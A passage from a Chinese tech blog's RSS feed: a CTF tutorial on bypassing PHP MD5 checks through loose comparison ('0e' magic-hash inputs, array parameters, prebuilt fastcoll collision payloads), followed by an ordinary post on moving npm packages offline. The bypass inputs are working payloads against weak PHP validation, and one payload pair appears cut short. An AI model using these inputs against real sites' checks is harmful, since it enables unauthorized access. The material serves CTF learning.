class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> == <span class="variable">$b</span>) &#123;</span><br><span class="line">  <span class="comment">//输出这行</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;相等&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;不相等&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上述代码中，比较结果相等，由于 $b 是字符串类型，因此 $a 将被自动转换为字符串类型后再进行比较。</p><h2 id="常见的弱相等"><a href="#常见的弱相等" class="headerlink" title="常见的弱相等"></a>常见的弱相等</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 小数点</span></span><br><span class="line"><span class="number">1</span>==<span class="number">1.0000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正号</span></span><br><span class="line"><span class="number">2</span>==+<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 单双引号</span></span><br><span class="line"><span class="number">3</span>==<span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 科学计数法</span></span><br><span class="line"><span class="number">3</span>aaa==<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// md5</span></span><br></pre></td></tr></table></figure><h1 id="md5绕过-1"><a href="#md5绕过-1" class="headerlink" title="md5绕过"></a>md5绕过</h1><h2 id="1-0E绕过"><a href="#1-0E绕过" class="headerlink" title="1. 0E绕过"></a>1. 0E绕过</h2><p>0e开头，后面全是数字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line"></span><br><span class="line"><span class="number">240610708</span> </span><br><span class="line"><span class="number">0e462097431906509019562988736854</span></span><br><span class="line"></span><br><span class="line"><span class="number">314282422</span> </span><br><span class="line"><span class="number">0e990995504821699494520356953734</span></span><br><span class="line"></span><br><span class="line"><span class="number">571579406</span> </span><br><span class="line"><span class="number">0e972379832854295224118025748221</span></span><br><span class="line"></span><br><span class="line"><span class="number">903251147</span> </span><br><span class="line"><span class="number">0e174510503823932942361353209384</span></span><br><span class="line"></span><br><span class="line"><span class="number">1110242161</span> </span><br><span class="line"><span class="number">0e435874558488625891324861198103</span></span><br><span class="line"><span class="number">1320830526</span> </span><br><span class="line"><span class="number">0e912095958985483346995414060832</span></span><br><span class="line"><span class="number">1586264293</span> </span><br><span class="line"><span class="number">0e622743671155995737639662718498</span></span><br><span class="line"><span class="number">2302756269</span> </span><br><span class="line"><span class="number">0e250566888497473798724426794462</span></span><br><span class="line"><span class="number">2427435592</span> </span><br><span class="line"><span class="number">0e067696952328669732475498472343</span></span><br><span class="line"><span class="number">2653531602</span> </span><br><span class="line"><span class="number">0e877487522341544758028810610885</span></span><br><span class="line"><span class="number">3293867441</span> </span><br><span class="line"><span class="number">0e471001201303602543921144570260</span></span><br><span class="line"><span class="number">3295421201</span> </span><br><span class="line"><span class="number">0e703870333002232681239618856220</span></span><br><span class="line"><span class="number">3465814713</span> </span><br><span class="line"><span class="number">0e258631645650999664521705537122</span></span><br><span class="line"><span class="number">3524854780</span> </span><br><span class="line"><span class="number">0e507419062489887827087815735195</span></span><br><span class="line"><span class="number">3908336290</span> </span><br><span class="line"><span class="number">0e807624498959190415881248245271</span></span><br><span class="line"><span class="number">4011627063</span> </span><br><span class="line"><span class="number">0e485805687034439905938362701775</span></span><br><span class="line"><span class="number">4775635065</span> </span><br><span class="line"><span class="number">0e998212089946640967599450361168</span></span><br><span class="line"><span class="number">4790555361</span> </span><br><span class="line"><span class="number">0e643442214660994430134492464512</span></span><br><span class="line"><span class="number">5432453531</span> </span><br><span class="line"><span class="number">0e512318699085881630861890526097</span></span><br><span class="line"><span class="number">5579679820</span> </span><br><span class="line"><span class="number">0e877622011730221803461740184915</span></span><br><span class="line"><span class="number">5585393579</span> </span><br><span class="line"><span class="number">0e664357355382305805992765337023</span></span><br><span class="line"><span class="number">6376552501</span> </span><br><span class="line"><span class="number">0e165886706997482187870215578015</span></span><br><span class="line"><span class="number">7124129977</span> </span><br><span class="line"><span class="number">0e500007361044747804682122060876</span></span><br><span class="line"><span class="number">7197546197</span> </span><br><span class="line"><span class="number">0e915188576072469101457315675502</span></span><br><span class="line"><span class="number">7656486157</span> </span><br><span class="line"><span class="number">0e451569119711843337267091732412</span></span><br><span class="line">QLTHNDT </span><br><span class="line"><span class="number">0e405967825401955372549139051580</span></span><br><span class="line">QNKCDZO </span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">EEIZDOI </span><br><span class="line"><span class="number">0e782601363539291779881938479162</span></span><br><span class="line">TUFEPMC </span><br><span class="line"><span class="number">0e839407194569345277863905212547</span></span><br><span class="line">UTIPEZQ </span><br><span class="line"><span class="number">0e382098788231234954670291303879</span></span><br><span class="line">UYXFLOI </span><br><span class="line"><span class="number">0e552539585246568817348686838809</span></span><br><span class="line">IHKFRNS </span><br><span class="line"><span class="number">0e256160682445802696926137988570</span></span><br><span class="line">PJNPDWY </span><br><span class="line"><span class="number">0e291529052894702774557631701704</span></span><br><span class="line">ABJIHVY </span><br><span class="line"><span class="number">0e755264355178451322893275696586</span></span><br><span class="line">DQWRASX </span><br><span class="line"><span class="number">0e742373665639232907775599582643</span></span><br><span class="line">DYAXWCA </span><br><span class="line"><span class="number">0e424759758842488633464374063001</span></span><br><span class="line">GEGHBXL </span><br><span class="line"><span class="number">0e248776895502908863709684713578</span></span><br><span class="line">GGHMVOE </span><br><span class="line"><span class="number">0e362766013028313274586933780773</span></span><br><span class="line">GZECLQZ </span><br><span class="line"><span class="number">0e537612333747236407713628225676</span></span><br><span class="line">NWWKITQ </span><br><span class="line"><span class="number">0e763082070976038347657360817689</span></span><br><span class="line">NOOPCJF </span><br><span class="line"><span class="number">0e818888003657176127862245791911</span></span><br><span class="line">MAUXXQC </span><br><span class="line"><span class="number">0e478478466848439040434801845361</span></span><br><span class="line">MMHUWUV </span><br><span class="line"><span class="number">0e701732711630150438129209816536</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-数组绕过（PHP8以后不可用，一般在5和7使用）"><a href="#2-数组绕过（PHP8以后不可用，一般在5和7使用）" class="headerlink" title="2. 数组绕过（PHP8以后不可用，一般在5和7使用）"></a>2. 数组绕过（PHP8以后不可用，一般在5和7使用）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /param.php?a[]=1&amp;b[]=2</span></span><br></pre></td></tr></table></figure><h2 id="3-md5碰撞"><a href="#3-md5碰撞" class="headerlink" title="3.md5碰撞"></a>3.md5碰撞</h2><p>一般用在题目有<code>string</code>转换时</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]!==(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; </span><br><span class="line">  <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>强制转换成string，这时候会发现，0e不行，数组也不行，这就要用到md5碰撞了</p><p>其实就是生成两段文本不同但是md5相同的文本</p><p>这里推荐使用windows下的<a href="https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">fastcoll_v1.0.0.5</a></p><p>如果链接失效了，且你能找到我的联系方式的话，我发你一份(●ˇ∀ˇ●)</p><p>用法很简单</p><h3 id="（1）新建一个txt，随便写点东西"><a href="#（1）新建一个txt，随便写点东西" class="headerlink" title="（1）新建一个txt，随便写点东西"></a>（1）新建一个txt，随便写点东西</h3><h3 id="（2）把txt拖到fastcoll-exe上"><a href="#（2）把txt拖到fastcoll-exe上" class="headerlink" title="（2）把txt拖到fastcoll.exe上"></a>（2）把txt拖到fastcoll.exe上</h3><h3 id="（3）使用代码读取新生成的两个文件值"><a href="#（3）使用代码读取新生成的两个文件值" class="headerlink" title="（3）使用代码读取新生成的两个文件值"></a>（3）使用代码读取新生成的两个文件值</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;D:tmp\a_msg1.txt&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;D:tmp\a_msg2.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span> === <span class="variable">$b</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(true)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>每次生成也挺麻烦的，这里我给几个已经生成好的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意，post时一定要urlencode！！！</span></span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">a=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2   </span><br><span class="line">b=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2   </span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">a=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2   </span><br><span class="line">b=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span>;</span><br></pre></td></tr></table></figure><p>$a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<br>$b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</p>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/CTF/">CTF</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/04/17/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%83%EF%BC%89%E2%80%94%E2%80%94md5%E7%BB%95%E8%BF%87/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>无星的前端之旅（二十八）-如何迁移npm包</title>
      <link>http://blog.xingxiaowu.cn/2023/11/21/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B9%9D%EF%BC%89%E2%80%94%E2%80%94%E5%A6%82%E4%BD%95%E8%BF%81%E7%A7%BBnpm%E5%8C%85/</link>
      <guid>http://blog.xingxiaowu.cn/2023/11/21/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B9%9D%EF%BC%89%E2%80%94%E2%80%94%E5%A6%82%E4%BD%95%E8%BF%81%E7%A7%BBnpm%E5%8C%85/</guid>
      <pubDate>Tue, 21 Nov 2023 10:23:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;我有一台外网电脑，还有一台内网电脑，内网的镜像源全靠人手工上传包，且平时几乎不更新，所以包的版本都很低。&lt;/p&gt;
&lt;p&gt;我喜欢做一些简单的工具，仅自己使用，而且我喜欢用最新的版本，内部的源无法满足我的需求。&lt;/p&gt;
&lt;p&gt;而且，我平时是使用pnpm管理。&lt;/p&gt;
&lt;p&gt;那么接下来，我来介绍几种方式，以应对这个情况。&lt;/p&gt;
&lt;h1 id=&quot;方式一&quot;&gt;&lt;a href=&quot;#方式一&quot; class=&quot;headerlink&quot; title=&quot;方式一&quot;&gt;&lt;/a&gt;方式一&lt;/h1&gt;&lt;p&gt;针对使用&lt;code&gt;yarn&lt;/code&gt;和&lt;code&gt;npm&lt;/code&gt;包管理器的，非常简单，整个&lt;code&gt;node_modules&lt;/code&gt;搬进去就行了。&lt;/p&gt;
&lt;h1 id=&quot;方式二&quot;&gt;&lt;a href=&quot;#方式二&quot; class=&quot;headerlink&quot; title=&quot;方式二&quot;&gt;&lt;/a&gt;方式二&lt;/h1&gt;&lt;p&gt;使用&lt;code&gt;tar&lt;/code&gt;包&lt;/p&gt;
&lt;p&gt;访问淘宝镜像站点&lt;code&gt;https://npmmirror.com/&lt;/code&gt;&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>我有一台外网电脑，还有一台内网电脑，内网的镜像源全靠人手工上传包，且平时几乎不更新，所以包的版本都很低。</p><p>我喜欢做一些简单的工具，仅自己使用，而且我喜欢用最新的版本，内部的源无法满足我的需求。</p><p>而且，我平时是使用pnpm管理。</p><p>那么接下来，我来介绍几种方式，以应对这个情况。</p><h1 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h1><p>针对使用<code>yarn</code>和<code>npm</code>包管理器的，非常简单，整个<code>node_modules</code>搬进去就行了。</p><h1 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h1><p>使用<code>tar</code>包</p><p>访问淘宝镜像站点<code>https://npmmirror.com/</code></p><p>搜索任意包，都能在右边发现一个<code>tar</code>包下载</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E5%89%8D%E7%AB%AF29/image.png" alt="如图"></p><p>点击下载，<code>pnpm add xx.tar</code>即可</p><h2 id="但是这样有个问题，这个包的依赖包怎么办？"><a href="#但是这样有个问题，这个包的依赖包怎么办？" class="headerlink" title="但是这样有个问题，这个包的依赖包怎么办？"></a>但是这样有个问题，这个包的依赖包怎么办？</h2><p>实际上，我们可以先看一下依赖包</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E5%89%8D%E7%AB%AF29/2.png" alt="2"></p><p>如果包A的依赖包不多的话，先将A的依赖包全部下载，然后解压缩A包，将<code>package.json</code>中的依赖修改为<code>file:xxx</code>路径的方式，详情可见<a href="http://localhost:4000/2023/08/18/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%94%EF%BC%89%E2%80%94%E2%80%94%20PlayWright%E5%86%85%E7%BD%91%E5%8D%87%E7%BA%A7/">无星的前端之旅（二十八）—— 离线安装npm库</a></p><p>那要是太多呢？咋整<br>&#x2F;&#x2F; TODO 未完待续</p>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%89%8D%E7%AB%AF/">前端</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/%E5%89%8D%E7%AB%AF/">前端</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2023/11/21/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B9%9D%EF%BC%89%E2%80%94%E2%80%94%E5%A6%82%E4%BD%95%E8%BF%81%E7%A7%BBnpm%E5%8C%85/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
